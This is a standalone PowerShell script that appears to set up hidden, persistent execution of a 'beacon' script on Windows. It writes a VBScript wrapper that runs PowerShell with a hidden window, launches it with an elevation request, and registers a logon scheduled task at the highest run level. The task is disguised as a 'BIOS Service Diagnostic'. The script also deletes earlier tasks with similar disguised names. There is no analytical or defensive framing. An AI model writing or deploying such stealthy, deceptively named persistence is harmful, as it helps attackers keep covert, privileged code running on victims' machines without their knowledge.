Unregister-ScheduledTask -TaskName "BIOS Utility" -Confirm:$false
Unregister-ScheduledTask -TaskName "BLACK FRIDAY Task (One-Time)" -Confirm:$false

# PowerShell script
$script = @"
C:\temp\beacon\elevate\GetState.ps1
"@
$script | Out-File -FilePath "C:\temp\NewProcess.ps1" -Encoding ascii

# VBScript wrapper
$vbscript = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -File C:\temp\NewProcess.ps1", 0
"@
$vbscript | Out-File -FilePath "C:\temp\RunHidden.vbs" -Encoding ascii

# Execute the VBScript
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command `"Start-Process 'C:\temp\RunHidden.vbs' -WindowStyle Hidden -Verb RunAs`""

# Register Scheduled Task to run VBScript at logon with elevated privileges
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"Start-Process 'C:\temp\RunHidden.vbs' -WindowStyle Hidden -Verb RunAs`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS NewProcess" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
